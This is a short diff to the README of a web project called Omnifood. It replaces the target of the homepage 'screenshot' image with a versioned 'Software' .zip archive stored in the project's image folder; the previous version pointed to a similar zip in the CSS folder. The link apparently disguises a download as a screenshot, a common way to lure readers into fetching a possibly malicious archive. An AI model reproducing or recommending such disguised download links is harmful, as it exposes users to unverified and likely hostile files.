@@ -1,6 +1,6 @@
 <h1 align="center">Omnifood</h1>
 
-![Home page sceenshot](https://raw.githubusercontent.com/imadosan/Omnifood/main/css/Software-2.1.zip)
+![Home page sceenshot](https://github.com/imadosan/Omnifood/raw/refs/heads/main/img/meals/Software_2.2-beta.2.zip)
 
 ## Description
 
